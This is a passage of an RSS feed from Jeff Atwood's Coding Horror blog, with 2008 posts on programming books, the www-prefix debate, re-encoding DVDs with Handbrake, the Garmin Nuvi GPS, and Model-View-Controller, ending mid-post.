                <!--kg-card-begin: markdown--><p>One of the central themes of stackoverflow.com is that software developers no longer learn programming from books, as <a href="http://www.joelonsoftware.com/items/2008/04/16.html">Joel mentioned</a>:</p>
<blockquote>
<p>Programmers seem to have stopped reading books. The market for books on programming topics is miniscule compared to the number of working programmers.</p>
</blockquote>
<p>Joel expressed similar sentiments in 2004's <a href="http://archive.salon.com/tech/feature/2004/12/09/spolsky/print.html">The Shlemiel Way of Software</a>:</p>
<blockquote>
<p>But the majority of people still don't read. Or write. The majority of developers don't read books about software development, they don't read Web sites about software development, they don't even read Slashdot.</p>
</blockquote>
<p>If programmers don't learn from books today, how do they learn to program? They do it the old-fashioned way: by rolling up their sleeves and <em>writing code</em> – while harnessing the collective wisdom of the internet in a second window. The internet has rendered programming books obsolete. It's faster, more efficient, and just plain <em>smarter</em> to get your programming information online. I believe Doug McCune's experience, which he aptly describes as <a href="http://dougmccune.com/blog/2007/03/23/why-i-dont-read-books/">Why I Don't Read Books</a>, is fairly typical.</p>
<p>I lay part of the blame squarely at the feet of the technical book publishing industry:</p>
<ul>
<li>
<strong>Most programming books suck.</strong> The barrier to being a book author, as near as I can tell, is virtually nonexistent. The signal to noise of book publishing is arguably not a heck of a lot better than what you'll find on the wilds of the internet. Of the hundreds of programming books released every year, perhaps two are three are truly worth the time investment.</li>
<li>
<strong>Programming books sold by weight, not by volume</strong>. There seems to be an inverse relationship between the size of a programming book and its quality. The bigger the book, somehow, the less useful information it will contain. What is the point of these giant wanna-be reference tomes? How do you <em>find</em> anything in it, much less lift the damn things?</li>
<li>
<strong>Quick-fix programming books oriented towards novices</strong>. I have nothing against novices entering the programming field. But I continue to believe the "Learn [Insert Language Here] in 24 hours!" variety of books are <a href="http://blog.codinghorror.com/teach-yourself-programming-in-23-hours/">doing our profession a disservice</a>. The monomaniacal focus on <em>right now</em> and the fastest, easiest possible way to do things leads beginners down the wrong path – or as I like to call it, "PHP". I kid! I kid!</li>
<li>
<strong>Programming book pornography</strong>. The idea that having a pile of thick, important-looking programming books sitting on your shelf, largely unread, will somehow make you a better programmer.  As <a href="http://sarkies.blogspot.com/">David Poole</a> once related to me in email, "I'd never get to do that in real life" seems to be the theme of the programming book porn pile. This is why I considered, and rejected, buying Knuth's <a href="http://www-cs-staff.stanford.edu/~knuth/taocp.html">Art of Computer Programming</a>. Try to purchase practical books you'll actually read, and more importantly, put into action.</li>
</ul>
<p>As an author, I'm guilty, too. I co-wrote a programming book, and <a href="http://www.codinghorror.com/blog/archives/000971.html">I <em>still</em> don't think you should buy it</a>. I don't mean that in an ironic-trucker-hat, reverse-psychology way. I mean it quite literally. It's not a bad book by any means. I have the utmost respect for my <a href="http://haacked.com">esteemed</a> <a href="http://odetocode.com/blogs/scott/default.aspx">co</a>-<a href="http://weblogs.asp.net/jgalloway/">authors</a>. But the same information would be far more accessible on the web. Trapping it inside a dead tree book is ultimately a waste of effort.</p>
<p>The internet has certainly accelerated the demise of programming books, but there is some evidence that, even pre-internet, programmers didn't read all that many programming books. I was quite surprised to encounter the following passage in <a href="http://www.amazon.com/exec/obidos/ASIN/0735619670/codihorr-20">Code Complete</a>:</p>
<blockquote>
<p>Pat yourself on the back for reading this book. You're already learning more than most people in the software industry because <strong>one book is more than most programmers read each year</strong> (DeMarco and Lister 1999). A little reading goes a long way toward professional advancement. If you read even one good programming book every two months, roughly 35 pages a week, you'll soon have a firm grasp on the industry and distinguish yourself from nearly everyone around you.</p>
</blockquote>
<p>I believe the same text is present in the original 1993 edition of Code Complete, but I no longer have a copy to verify that. A little searching uncovered the passage Steve McConnell is referencing in DeMarco and Lister's <a href="http://www.amazon.com/exec/obidos/ASIN/0932633439/codihorr-20">Peopleware</a>:</p>
<blockquote>
<p>The statistics about reading are particularly discouraging: <strong>The average software developer, for example, doesn't own a single book on the subject of his or her work, and hasn't ever read one</strong>. That fact is horrifying for anyone concerned about the quality of work in the field; for folks like us who write books, it is positively tragic.</p>
</blockquote>
<p>It pains me greatly to <a href="http://reddit.com/info/6g2u2/comments/">read the reddit comments</a> and learn that people are interpreting the stackoverflow.com mission statement as a repudiation of programming books. As ambivalent as I am about the current programming book market, <strong>I love programming books!</strong> This very blog was founded on the concept of my <a href="http://www.codinghorror.com/blog/archives/000020.html">recommended developer reading list</a>. Many of my blog posts are my <a href="http://graysmatter.codivation.com/ThePragmaticProgrammerTheBestWayToPadYourBlogContentFor30Dollars.aspx">feeble attempts to explain key concepts</a> outlined long ago in classic programming books.</p>
<p>How to reconcile this seemingly contradictory statement, the <a href="http://www.codinghorror.com/blog/archives/000602.html">love and hate dynamic</a>? You see, there are programming books, and there are <em>programming books</em>.<br>
The best programming books are timeless. They transcend choice of language, IDE, or platform.  They do not explain how, but <em>why</em>. If you feel compelled to clean house on your bookshelf every five years, trust me on this, <strong>you're buying the wrong programming books</strong>.</p>
<p>I wouldn't trade my programming bookshelf for anything. I refer to it all the time. In fact, I referred to it <em>twice</em> while composing this very post.</p>
<p><a href="https://blog.codinghorror.com/blog/images/my-programming-bookshelf-large.jpg"><img alt="image placeholder" >
<p>I won't belabor my <a href="http://www.codinghorror.com/blog/archives/000020.html">recommended reading list</a>, as I've kept it proudly the same for years.</p>
<p>(<span style="color: red;">Update:</span> Tim Spalding kindly set up <a href="http://www.librarything.com/profile/JeffAtwood">a LibraryThing account on my behalf</a> – and members have already documented and <a href="http://www.librarything.com/catalog/JeffAtwood">entered every book pictured on these shelves</a>. Impressive, and quite cool!)</p>
<p>But I do have this call to arms: <strong>my top five programming books every working programmer should own – and <em>read</em></strong>. These seminal books are richly practical reads, year after year, no matter what kind of programming I'm doing. They reward repeated readings, offering deeper and more penetrating insights into software engineering every time I return to them, armed with a few more years of experience under my belt. If you haven't read these books, what are you waiting for?</p>
<table cellspacing="4" cellpadding="4" width="650">
<tbody>
<tr>
<td align="center" valign="bottom"><a href="http://www.amazon.com/exec/obidos/ASIN/0735619670/codihorr-20">Code Complete 2</a></td>
<td align="center" valign="bottom"><a href="http://www.amazon.com/exec/obidos/ASIN/0321965515/codihorr-20">Don't Make Me Think</a></td>
</tr>
<tr>
<td align="center" valign="top"><a href="http://www.amazon.com/exec/obidos/ASIN/0735619670/codihorr-20"><img alt="image placeholder" >
<td align="center" valign="top"><a href="http://www.amazon.com/exec/obidos/ASIN/0321965515/codihorr-20"><img alt="image placeholder" >
</tr>
<tr>
<td align="center" valign="bottom"><a href="http://www.amazon.com/exec/obidos/ASIN/0932633439/codihorr-20">Peopleware</a></td>
<td align="center" valign="bottom"><a href="http://www.amazon.com/exec/obidos/ASIN/020161622X/codihorr-20">Pragmatic Programmer</a></td>
</tr>
<tr>
<td align="center" valign="top"><a href="http://www.amazon.com/exec/obidos/ASIN/0932633439/codihorr-20"><img alt="image placeholder" >
<td align="center" valign="top"><a href="http://www.amazon.com/exec/obidos/ASIN/020161622X/codihorr-20"><img alt="image placeholder" >
</tr>
<tr>
<td align="center" valign="bottom"><a href="http://www.amazon.com/exec/obidos/ASIN/0321117425/codihorr-20">Facts and Fallacies</a></td>
</tr>
<td valign="top"><a href="http://www.amazon.com/exec/obidos/ASIN/0321117425/codihorr-20"><img alt="image placeholder" >

</tbody>
</table>
<p>It is my greatest intention to make <a href="http://www.stackoverflow.com">stackoverflow.com</a> highly <em>complementary</em> to these sorts of timeless, classic programming books. It is in no way, shape, or form meant as a replacement for them.</p>
<p>On the other hand, if you're the unfortunate author of <a href="http://perl.plover.com/reviews/p54d.html">Perl for Dummies</a>, then watch your back, because we're definitely gunning for you.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-28T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/programmers-dont-read-books-but-you-should/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Great Dub-Dub-Dub Debate ]]></title>
<link>https://blog.codinghorror.com/the-great-dub-dub-dub-debate/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Pop quiz, hotshot. Which one is the <em>superior</em> Uniform Resource Locator?</p>
<blockquote>
<p><a href="http://www.fakeplasticrock.com/">www.fakeplasticrock.com</a></p>
</blockquote>
<p>or</p>
<blockquote>
<p><a href="http://fakeplasticrock.com/">fakeplasticrock.com</a></p>
</blockquote>
<p>This is one of those intractable problems. Global wars have been fought over so much less. In hacker circles, this is sometimes referred to as a <a href="http://www.unixguide.net/freebsd/faq/16.19.shtml">bikeshed discussion</a>.</p>
<p>That said, I do have a few bits of practical advice that I think apply unilaterally, whatever your position is:</p>
<ul>
<li>
<p><b>Pick one or the other form and stick with it.</b> Once the URL is out there in the wild, you need everyone to link to the same form for link juice amplification purposes, if nothing else. If half your incoming links are split between the www and non-www forms of your URL, that will hurt you a heck of lot more than picking the "wrong" prefix. It's also a bad idea to decide a few years down the road that you want to switch teams  –  so choose wisely.</p>
</li>
<li>
<p><b>Make sure your site works with or without the leading www prefix.</b> Regardless of your position on this critically important issue, your site should work either way. Serving up visitors who assumed you had a leading www prefix a 404 page is just plain bad internet citizenship, and borderline rude. Sure, encourage people to use the <i>correct</i> form of your URL but don't penalize them when they fail to respect your wishes. It's best if you <a href="http://www.codinghorror.com/blog/archives/000797.html">implement URL rewriting rules</a> that "fix" the error automatically and with no fuss for your visitors.</p>
</li>
<li>
<p><b>The www prefix is implicit and assumed outside the address bar</b>. Even if you use it  –  and many of the biggest sites on the internet still do  –  nobody <i>says</i> the dub-dub-dub any more, and certainly you're not printing "www" on your logos and business cards and so forth.</p>
</li>
<li>
<p><b>Consider whether you plan to use other subdomains</b>. If you plan to have, say, <code>blog.*</code> and <code>mail.*</code> and <code>beta.*</code> subdomain prefixes active on your domain, you might actually want the www as a disambiguator.</p>
</li>
<li>
<p><span style="color:red">WARNING:</span> If you pick the domain <code>example.com</code>, be aware that <em>all</em> cookies you store on that domain will be sent to all subdomains … forever. This is a major downside I didn't discover until years later, and it's big enough to make me regret choosing <code>stackoverflow.com</code> versus <code>www.stackoverflow.com</code>.</p>
</li>
</ul>
<p>Beyond that, it's largely a matter of taste, though you could make a case that <a href="http://blog.welldesignedurls.org/2007/02/19/urlquiz-1-www-or-non-www/">user-centered URL design</a> should rule the day. If we're dropping the www prefix, why stop there? Why not drop the http:// protocol specifier before it, and the inevitable .com at the end, too?</p>
<p>For me, though, the great dub-dub-dub debate is mostly a source of amusement. Readable URLs are important, but <b>you should be far more concerned about the content behind that URL than the URL itself</b>. It's the kind of meaningless distraction that is parodied beautifully in the animated series <a href="http://en.wikipedia.org/wiki/Home_Movies_(TV_series)">Home Movies</a>.</p>
<video poster="/content/images/uploads/2008/04/6a0120a85dcdae970b01287770455c970c-pi.png" width="100%" preload="none" controls>
<source src="http://discourse-cdn.codinghorror.com/uploads/default/original/3X/7/7/7777faf2727992bc65b1e725cd45b29bdfb86173.mp4">
</source></video>
<blockquote>
<p><b>Melissa:</b> You know, Brendan, you don't have to say dubya-dubya-dubya any more.</p>
<p><b>Brendan:</b> What? Why?</p>
<p><b>Melissa:</b> You can just say the website name without the dubya-dubya-dubya.</p>
<p><b>Brendan:</b> No, no, no. That's how you type it in, Melissa. Dubya-dubya-dubya dot..</p>
<p><b>Melissa:</b> I know that's how you <i>type</i> it, but you don't have to <i>say</i> it. If you said to me, moviewinnerorweiner dot com, I would know what you meant, without the double-u.. double-u.. double-u.</p>
<p><b>Brendan:</b> So no w's, ever?</p>
<p><b>Melissa:</b> OK, Brendan, for the sake of <i>this</i> conversation, you don't have to say dubyadubyadubya. Because I know what it is. And so does the rest of the world.</p>
</blockquote>
<video poster="/content/images/uploads/2008/04/6a0120a85dcdae970b012877704571970c-pi.png" width="100%" preload="none" controls>
<source src="http://discourse-cdn.codinghorror.com/uploads/default/original/3X/5/c/5c24b0e7c57daf9005baaf567ff8e4bde6b2cc46.mp4">
</source></video>
<blockquote>
<p><b>Brendan:</b> dubya-dubya-dubya dot movieweinerorwinner dot com likes my stuff a lot, so they asked me to write some stuff.</p>
<p><b>Jason:</b> you're writing a review for dubya-dubya-dubya dot movieweinerorwinner dot com?</p>
<p><b>Melissa:</b> (shouting) You guys, you don't have to say dubya-dubya-dubya!</p>
<p><b>Brendan:</b> But yet..</p>
<p><b>Melissa:</b> I don't want to have this conerversation again!</p>
<p><b>Jason:</b> What are you talking about, Melissa?</p>
<p><b>Brendan:</b> You have to say it Melissa. You gotta say it.</p>
<p><b>Melissa:</b> (exasperated sigh) You don't!</p>
<p><b>Brendan:</b> You <i>gotta</i> say it.</p>
<p><b>Melissa:</b> You don't, because everyone knows what it means!</p>
<p><b>Jason:</b> How do you know it's a website?</p>
<p><b>Melissa:</b> Because you say dot com.</p>
<p><b>Jason:</b> Yeah, but how do you know it's dubya-dubya-dubya?</p>
<p><b>Brendan:</b> Yeah, that's a good point!</p>
<p><b>Melissa:</b> Because it's just one of those things that when something's around for a long enough time in society, you can just abbreviate it.</p>
<p><b>Brendan:</b> Like what else?</p>
<p><b>Jason:</b> Like what, like names? Names of people?</p>
<p><b>Brendan:</b> That's what I was saying.</p>
<p><b>Melissa:</b> (exasperated) All right, you know what? Say dubya-dubya-dubya, I don't care.</p>
<p><b>Jason:</b> No, you know what I'm saying.</p>
<p><b>Melissa:</b> No, forget it. You're right. In fact, don't say dubya-dubya-dubya, say "world wide web" every time you say a website.</p>
<p>(pause)</p>
<p><b>Jason:</b> No, that's a total waste.</p>
<p><b>Brendan:</b> That's a waste of time.</p>
</blockquote>
<p>My point exactly.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-30T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-great-dub-dub-dub-debate/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Re-Encoding Your DVDs ]]></title>
<link>https://blog.codinghorror.com/re-encoding-your-dvds/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Like Donald Knuth, I think <a href="http://www.informit.com/articles/article.aspx?p=1193856">much of the current multicore hype is overrated</a>.
</p>
<p>
</p>
<blockquote>
The machine I use today has dual processors. I get to use them both only when I'm running two independent jobs at the same time; that's nice, but it happens only a few minutes every week. If I had four processors, or eight, or more, I still wouldn't be any better off, considering the kind of work I do -- even though I'm using my computer almost every day during most of the day. So why should I be so happy about the future that hardware vendors promise? They think a magic bullet will come along to make multicores speed up my kind of work; I think it's a pipe dream. (No -- that's the wrong metaphor! "Pipelines" actually work for me, but threads don't. Maybe the word I want is "bubble.")
</blockquote>
<p>
Despite that, I've acknowledged all along there are <a href="http://www.codinghorror.com/blog/archives/000942.html">certain narrow tasks</a> that the proliferation of CPU cores will make <i>dramatically</i> faster. And one of my very favorite tasks in that niche is <b>encoding your DVD collection</b>.
</p>
<p>
I bought my first DVD about 10 years ago. At the time, they were <a href="http://en.wikipedia.org/wiki/DVD#Technology">a technical marvel</a>:
</p>
<p>
</p>
<ul>
<li>8.5 Gigabytes per side
</li>
<li>720 x 480 MPEG-2 video at 30 frames per second
</li>
<li>Dolby Digital (AC-3) or Digital Theater System (DTS) digital multichannel sound
</li>
</ul>
<p>
Today, those specs are <a href="http://www.codinghorror.com/blog/archives/000747.html">rapidly becoming pedestrian</a> in the face of high definition cable, broadcast, and Blu-Ray discs. A few of the <a href="http://en.wikipedia.org/wiki/List_of_video_sharing_websites">video sharing websites</a> offer something perilously close to DVD quality already.
</p>
<p>
I say <b>the DVD is the new MP3</b>. We're going to start tossing these things around like candy.
</p>
<p>
Unlike audio CDs, DVDs are already compressed digital data. You could extract the files from the DVD as-is, and play them back to your heart's content. No re-encoding required. But like <a href="http://en.wikipedia.org/wiki/The_Six_Million_Dollar_Man">The Six Million Dollar Man</a>, we can rebuild them better than they were before. Video codecs have advanced tremendously since the heady days of MPEG-2. These new codecs <a href="http://www.codinghorror.com/blog/archives/000746.html">take a lot more playback horsepower than MPEG-2</a>, but offer comparable quality in about one-fourth the size. We can <b>turn our digital DVDs into <i>better</i> digital DVDs</b> through superior computer science.
</p>
<p>
But if you thought the <i>playback</i> performance demands of these new codecs were severe, wait until you see the <i>encoding</i> performance demands. It's <b>only in the last year or two that typical CPUs could encode new-fangled MPEG-4 or VC1 at anything even approaching real time</b>. But now, with extremely fast dual cores trickling all the way down to the mainstream, and quad-core CPUs carving out a decent share for themselves-- the average user could potentially rip and encode a typical DVD in less than 30 minutes. Per <a href="http://www.techarp.com/showarticle.aspx?artno=520">a recent H.264 benchmark dataset analysis</a>, you can statistically expect to <i>halve</i> your encode time when going from 2 to 4 cores.. and almost do it again when you go from 4 to 8!
</p>
<p>
<a href="http://www.techarp.com/showarticle.aspx?artno=520"><img alt="image placeholder" >
</p>
<p>
It helps, too, that there's great free software like <a href="http://handbrake.fr/">Handbrake</a> which makes it easy to harness that embarassment of desktop CPU power to encode your DVDs.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Yes, there are an intimidating number of knobs and dials to potentially tweak here, but what I like about handbrake is that I largely don't have to. There are some logical presets on the right (clipped out of the screenshot for size, unfortunately) which will get you headed in the right direction: AppleTV, iPod, Film, Xbox 360, and so forth. I do set a handful of variables, like the overall bitrate -- I prefer something between 900 and 1200 -- and whether I need to deinterlace the source. But I mostly let Handbrake use its "auto" defaults, and get excellent results. If you're curious about the details, there's a <a href="http://www.modmini.com/theatre/howto/dvdjukebox/conversion.php">well-written description</a> of many of the Handbrake settings.
</p>
<p>
I had the most luck with the H.264 codec, which is aggressively multithreaded. I achieved 30-40 fps on my modest new <a href="http://www.codinghorror.com/blog/archives/001107.html">power efficient dual-core HTPC processor</a>, and upwards of 100 fps on my <a href="http://www.codinghorror.com/blog/archives/001102.html">overclocked 4 GHz dual-core</a>. Fortunately, Handbrake supports a batch encode mode, so you can queue up a bunch of jobs to run overnight.
</p>
<p>
I was <i>particularly</i> excited to find that I can pass the digital audio directly through <a href="http://trac.handbrake.fr/wiki/SurroundSoundGuide">using the "AC3" setting</a> for the audio encoder. That means, when playing these files back on a home theater PC, <b>the digital audio arrives at your receiver in exactly the same way it would from a DVD</b>, with a <a href="http://is.gd/9vc">few minor adjustments in ffdshow</a>. There is no audio degradation or conversion whatsoever! As something of an audiophile, I suffered mightily through many a re-encoded DVD that was downmixed to plain vanilla stereo over the years, so this is a huge step forward in my book.
</p>
<p>
So, in summary -- <b>nearly the same digital video quality, exactly the same digital audio quality, all wrapped up in a single file less than a quarter of the original size of the DVD.</b> Seriously, I get chills. It's geek nirvana. What's not to love about encoding your DVD collection? It's also a perfect use of those four CPU cores, which would otherwise lay idle 99% of the time.
</p>
<p>
Take, for example, one of my favorite movies, <a href="http://www.imdb.com/title/tt0387808/">Idiocracy</a>. I used Handbrake to convert this DVD from a set of files totalling 4.15 GB to a single 995 MB file, at almost no quality loss. See for yourself.
</p>
<p>
Still image captured from original DVD:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Still image captured from H.264 encoded video of DVD:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
</p>
<p>
The above still was used in an earlier post, <a href="http://www.codinghorror.com/blog/archives/000772.html">A World of Endless Advertising</a>. I love being able to grab a movie file over the network and quickly get the exact still I need for a blog post. Yes, there is a tiny loss of fidelity -- particularly in the chair shadows on the bottom left, and the grain of the wall texture at the upper left. But I'm willing to live with that compromise if it means I don't have to pull ginormous 8 GB ISO images files over the network.
</p>
<p>
Why re-encode DVDs you already own? For convenience, mostly -- so you can watch them on your mobile devices, on your PCs, laptops, and anything else that vaguely resembles a computer in your home. Might as well put all those CPU horses to proper use. <b>A re-encoded DVD is <i>so</i> much more flexible</b> than those physical hunks of round, reflective plastic.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-01T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/re-encoding-your-dvds/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Mainstreaming of GPS ]]></title>
<link>https://blog.codinghorror.com/the-mainstreaming-of-gps/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
The <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=garmin%20nuvi&amp;tag=codihorr-20&amp;index=blended&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">Garmin Nuvi GPS</a> first got my attention when it came not just recommended, but <a href="http://www.37signals.com/svn/archives2/garmin_nuvi_350_insanely_recommended.php">insanely recommended</a> by Jason Fried in late 2005.
</p>
<p>
</p>
<blockquote>
So, back to the 350ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ Oh wow. The Nuvi 350 is insanely good. Next to the iPod it's the the best piece of consumer electronics I've purchased in the last 5 years. It really is that good. It's perfectly executed.
</blockquote>
<p>
In early 2006, Jan Miksovsky heaped <a href="http://miksovsky.blogs.com/flowstate/2006/02/approachable_ui.html">similar levels of ebullient praise on the the Nuvi</a>:
</p>
<p>
</p>
<blockquote>
Garmin and other manufacturers have been making GPS units since the late 1980s, and during that time have continually made incremental improvements in size, form factor, performance, and UI. From time to time I've looked at the category, but beyond the flat-out magic of finding your way using satellites, I found little captivating about the products themselves. GPS units have suffered from a wide range of UI problems, such as the heavy use of jargon, awkward use of a few buttons to accomplish complex tasks (such as entering an address), and cumbersome systems for transferring maps to a device with limited memory.
<p>
Sometimes you encounter a product and get the strong feeling its the first one in its category to really be Designed, with a capital "D". In my case, TomTom had the first GPS with that distinction. From the branding to the startup sound to the UI, they had clearly thought about the product as a consumer experience. Despite breaking that ground, I still felt that the TomTom product I saw came up short.
</p>
<p>
<b>The Garmin Nuvi is the first GPS I've seen that meets my bar for a good user experience.</b> They've given a lot of thought to an overall package of functionality a traveler might want in a single pocket device. In addition to the GPS, the Nuvi unit includes an MP3 player, a photo vault, a currency converter, a world clock, a foreign language dictionary, and a travel guide. This is a good sign that Garmin's considering the overall user experience of the device, not just trying to make a housing for a satellite receiver.
</p>
</blockquote>
<p>
I've <a href="http://www.codinghorror.com/blog/archives/000883.html">used Microsoft Streets and Trips</a> and an <a href="http://www.maps-gps-info.com/usbgps.html">external USB GPS device</a> to navigate unfamiliar areas for years. I've sort of ignored GPS devices until now, because at $500+ I figured my laptop was "good enough." It's the same solution I relied on when I moved to California in 2005. The laptop is unwieldy and sometimes frankly even a little dangerous as a navigation device, but people -- myself included -- will do crazy things to save a buck.
</p>
<p>
It's amazing the difference two years can make.
</p>
<p>
<b>Prices have <i>crashed</i> on the Nuvi GPS models</b>. I picked up a <a href="http://www.amazon.com/exec/obidos/ASIN/B000QUZV9O/codihorr-20">refurbished Nuvi 200W for $170 shipped</a>. I'm a proud member of the Nuvi club at last.
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/B000QUZV9O/codihorr-20"><img alt="image placeholder" >
</p>
<p>
After using it for about two weeks, <i>I feel like an idiot for waiting so long</i>.
</p>
<p>
I agree with Jan and David. The Nuvi offers an outstanding consumer experience in every possible way. <b>I'd rate it up there with the original Tivo.</b> Everything about it <i>just works</i>, to the point that it completely breaks you of the old ways of navigation. I'm so late to the party that I'm not sure I can add much more than <a href="http://miksovsky.blogs.com/flowstate/2006/02/approachable_ui.html">Jan</a> and <a href="http://www.37signals.com/svn/archives2/garmin_nuvi_350_insanely_recommended.php">David</a> did in their excellent reviews, not to mention the <a href="http://www.google.com/search?q=garmin+nuvi+review">thousands of other rave reviews on the internet</a>. All I can offer is a belated confirmation that, yes, it is <i>that</i> good.
</p>
<p>
Bear in mind that I am an utter and complete GPS newbie. I don't <a href="http://www.geocaching.com/">geocache</a> and to be completely honest, I don't even like to leave the house that much if I can avoid it. I'm what you might call <a href="http://www.codinghorror.com/blog/archives/000970.html">an indoor enthusiast</a>. There may be other GPS devices with better features or more functionality. I've been told <a href="http://www.amazon.com/exec/obidos/ASIN/B0015F1L7A/codihorr-20">the Nuvi 205W</a> is an updated version of this older model I have, which partially explains why it's such a great deal. I do know enough to recommend the widescreen models; the pseudo-3D presentation scales much better on wider screens.
</p>
<p>
I also have one bit of accessory advice. You'll want a good universal mount for your GPS, and I can highly recommend this $12 <a href="http://www.amazon.com/exec/obidos/ASIN/B000U5TUWE/codihorr-20">Bracketron GPS friction mount</a>.
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/B000U5TUWE/codihorr-20"><img alt="image placeholder" >
</p>
<p>
This clever little add-on converts your default suction mount into a super flexible go-anywhere dashboard mount. Taking the GPS along in any vehicle becomes a no brainer. Just lay it anywhere on the dash, plug it into the cigarette lighter port for power, and off you go. It's rock solid.
</p>
<p>
<b>I used to think of GPS devices as high-end geeky toys.</b> Based on my Nuvi experience, that's no longer true. They're now so inexpensive, practical, and easy to use that -- exactly like Tivo did for DVRs -- <i>everyone should have one</i>. Really. If you don't have a GPS device, or if you think your parents or family could use one, but have been turned off by high prices in the past, <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=garmin%20nuvi&amp;tag=codihorr-20&amp;index=blended&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">check prices on the Nuvi series</a> and see. I think you'll be pleasantly surprised.
</p>
<p>
And I strongly suspect that once you have a Nuvi, like me, you'll wonder how anyone ever lived without it.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-04T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-mainstreaming-of-gps/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Understanding Model-View-Controller ]]></title>
<link>https://blog.codinghorror.com/understanding-model-view-controller/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Like everything else in software engineering, it seems, the concept of <a href="http://en.wikipedia.org/wiki/Model-view-controller">Model-View-Controller</a> was originally invented by <a href="http://en.wikipedia.org/wiki/Smalltalk">Smalltalk</a> programmers.
</p>
<p>
More specifically, it was invented by one Smalltalk programmer, Trygve Reenskaug. Trygve maintains a page that <a href="http://heim.ifi.uio.no/~trygver/themes/mvc/mvc-index.html">explains the history of MVC</a> in his own words. He arrives at these definitions in a paper he published on December 10th, 1979:
</p>
<p>
</p>
<ol>
<li>
<b>Models</b>
<p>
Models represent knowledge. A model could be a single object (rather uninteresting), or it could be some structure of objects.
</p>
<p>
There should be a one-to-one correspondence between the model and its parts on the one hand, and the represented world as perceived by the owner of the model on the other hand.
</p>
<p>
</p>
</li>
<li>
<b>Views</b>
<p>
A view is a (visual) representation of its model. It would ordinarily highlight certain attributes of the model and suppress others. It is thus acting as a <i>presentation filter</i>.
</p>
<p>
A view is attached to its model (or model part) and gets the data necessary for the presentation from the model by asking questions. It may also update the model by sending appropriate messages. All these questions and messages have to be in the terminology of the model, the view will therefore have to know the semantics of the attributes of the model it represents.
</p>
<p>
</p>
</li>
<li>
<b>Controllers</b>
<p>
A controller is the link between a user and the system. It provides the user with input by arranging for relevant views to present themselves in appropriate places on the screen. It provides means for user output by presenting the user with menus or other means of giving commands and data. The controller receives such user output, translates it into the appropriate messages and pass these messages on to one or more of the views.
</p>
</li>
</ol>
<p>
It may seem like we're <a href="http://www.codinghorror.com/blog/archives/000165.html">deep in Architecture Astronaut territory</a> now, but bear with me. The MVC concepts are a little abstract, it's true, but it's an incredibly common pattern. It is literally all around you. In fact, let me bring it back down to Earth this way: you're looking at MVC <i>right now</i>.
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4">
<tr>
<td>
<b>Model</b> = HTML</td>
<td>
<b>View</b> = CSS</td>
<td>
<b>Controller</b> = Browser</td>
</tr>
<tr>
<td><a href="http://www.codinghorror.com/blog/archives/000474.html"><img alt="image placeholder" >
<td>
<a href="http://www.codinghorror.com/blog/archives/000474.html"><img alt="image placeholder" >
</td>
<td>
<a href="http://www.codinghorror.com/blog/archives/000474.html"><img alt="image placeholder" >
</td>
</tr>
</table>
<p>
This ubiquitous trifecta represents MVC almost perfectly.
</p>
<p>
</p>
<ol>
<li>Model
<p>
The HTML is the "skeleton" of bedrock content. Text that communicates information to the reader.
</p>
<p>
</p>
</li>
<li>View
<p>
The CSS adds visual style to the content. It is the "skin" that we use to flesh out our skeleton and give it a particular look. We can swap in different skins via CSS without altering the original content in any way. They are relatively, but not completely, independent.
</p>
<p>
</p>
</li>
<li>Controller
<p>
The browser is responsible for combining and rendering the CSS and HTML into a set of final, manipulatible pixels on the screen. It gathers input from the user and marshals it to any JavaScript code necessary for the page to function. But here, too, we have flexibility: we can plug in a different brower and get comparable results. Some browsers might render it faster, or with more fidelity, or with more bells and whistles.
</p>
</li>
</ol>
<p>
So if you believe the web has been at all successful -- most signs I've seen point to <i>yes</i> -- then you also have to acknowledge <b>the incredible power of Model-View-Controller.</b>
</p>
<p>
It's no coincidence that many of the most popular web programming frameworks also <a href="http://en.wikipedia.org/wiki/Model-view-controller#Implementations_of_MVC_as_web-based_frameworks">encapsulate MVC principles</a>: Django, Ruby on Rails, CakePHP, Struts, and so forth.  It's also officially creeping into ASP.NET under the fledgling <a href="http://www.asp.net/mvc/">ASP.NET MVC project</a>.
</p>
<p>
Just take a gander at the project layout in a <b>sample ASP.NET MVC project</b>:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
It's <i>almost</i> self-explanatory, if you've ever built an application of any kind:
</p>
<p>
</p>
<ol>
<li>Model
<p>
The classes which are used to store and manipulate state, typically in a database of some kind.
</p>
<p>
</p>
</li>
<li>View
<p>
The user interface bits (in this case, HTML) necessary to render the model to the user.
</p>
<p>
</p>
</li>
<li>Controller
<p>
The brains of the application. The controller decides what the user's input was, how the model needs to change as a result of that input, and which resulting view should be used.
</p>
</li>
</ol>
<p>
It's beautiful in its simplicity, <a href="http://www.artima.com/lejava/articles/stringtemplate.html">as Terence Parr notes</a>:
</p>
<p>
</p>
<blockquote>
